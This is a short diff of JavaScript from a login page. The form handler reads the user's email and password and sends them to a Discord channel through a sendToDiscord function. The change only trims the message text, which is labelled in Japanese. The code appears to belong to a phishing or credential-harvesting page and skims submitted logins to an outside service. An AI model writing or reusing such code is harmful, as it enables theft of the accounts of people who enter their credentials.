@@ -13,7 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const emailValue = emailInput.value;
         const passwordValue = passwordInput.value;
 
-        const messageContent = `**新しいログインがありました**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
+        const messageContent = `**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
         
         await sendToDiscord(messageContent);
         
